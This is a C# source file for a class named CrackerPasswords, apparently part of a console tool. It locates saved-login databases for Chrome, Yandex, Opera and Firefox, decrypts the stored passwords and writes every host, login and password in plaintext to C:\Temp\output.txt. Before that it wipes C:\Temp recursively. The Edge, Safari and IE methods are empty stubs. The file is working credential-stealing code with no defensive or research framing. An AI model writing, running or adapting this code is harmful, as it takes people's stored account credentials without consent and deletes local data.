using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using static ConsoleMane.Program;

namespace ConsoleMane
{
    class CrackerPasswords
    {
        private const string fileName = @"C:\Temp\output.txt";
        public void CollectPasswords(List<Browser> browsers)
        {
            if (Directory.Exists(@"C:\Temp"))
            {
                Directory.Delete(@"C:\Temp", true);
            }

            Directory.CreateDirectory(@"C:\Temp");


            foreach (Browser browser in browsers)
            {
                switch (browser)
                {
                    case Browser.Chrome: collectByChrome(); break;
                    case Browser.Yandex: collectByYandex(); break;
                    case Browser.Safary: collectBySafary(); break;
                    case Browser.IE: collectByIE(); break;
                    case Browser.Mozilla: collectByMozilla(); break;
                    case Browser.Edge: collectByEdge(); break;
                    case Browser.Opera: collectByOpera(); break;
                }
            }
        }

        private void collectByChrome()
        {
            try
            {
                string filePath = BrowserSearcher.GetPathToBrowsers();
                filePath = String.Concat(filePath, @"\AppData\Local\Google\Chrome\User Data\Default\Login Data");
                Console.WriteLine(filePath);
                List<ChromePass> chrome = ChromeKit.GetChromiumPasswords(filePath);
                StreamWriter sw = new StreamWriter(fileName, true, Encoding.UTF8);
                sw.WriteLine("------------------------Chrome-----------------------------");
                foreach (var pair in chrome)
                {
                    sw.WriteLine($"Хост: {pair.Url}; Логин: {pair.Login}; Пароль: {pair.Password}");
                }
                sw.WriteLine("------------------------END-----------------------------");
                sw.Close();
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
            }
            return;
        }

        private void collectByYandex()
        {
            try
            {
                string filePath = BrowserSearcher.GetPathToBrowsers();
                filePath = String.Concat(filePath, @"\AppData\Local\Yandex\YandexBrowser\User Data\Default\Ya Login Data");
                List<ChromePass> chrome = ChromeKit.GetChromiumPasswords(filePath);
                StreamWriter sw = new StreamWriter(fileName, true, Encoding.UTF8);
                sw.WriteLine("------------------------Yandex-----------------------------");
                foreach (var pair in chrome)
                {
                    sw.WriteLine($"Хост: {pair.Url}; Логин: {pair.Login}; Пароль: {pair.Password}");
                }
                sw.WriteLine("------------------------END-----------------------------");
                sw.Close();
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
            }
            return;
        }
        private void collectByOpera()
        {
            try
            {
                string filePath = BrowserSearcher.GetPathToBrowsers();
                filePath = String.Concat(filePath, @"\AppData\Roaming\Opera Software\Opera Stable\Login Data");
                List<ChromePass> chrome = ChromeKit.GetChromiumPasswords(filePath);
                StreamWriter sw = new StreamWriter(fileName, true, Encoding.UTF8);
                sw.WriteLine("------------------------Opera-----------------------------");
                foreach (var pair in chrome)
                {
                    sw.WriteLine($"Хост: {pair.Url}; Логин: {pair.Login}; Пароль: {pair.Password}");
                }
                sw.WriteLine("------------------------END-----------------------------");
                sw.Close();
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
            }
            return;
        }

        private void collectByMozilla()
        {
            try
            {
                List<FirefoxPassword> passwords = Firefox.Passwords();
                StreamWriter sw = new StreamWriter(fileName, true, Encoding.UTF8);
                sw.WriteLine("------------------------Firefox-----------------------------");
                foreach (var firefox in passwords)
                {
                    sw.WriteLine($"Хост: {firefox.Host}; Логин: {firefox.Username}; Пароль: {firefox.Password}");
                }
                sw.WriteLine("------------------------END-----------------------------");
                sw.Close();
            }
            catch (Exception e) { Console.WriteLine(e.Message); }
        }

        #region Unused
        private string collectByEdge() { return ""; }
        private string collectBySafary() { return ""; }
        private string collectByIE() { return ""; }
        #endregion

    }
}
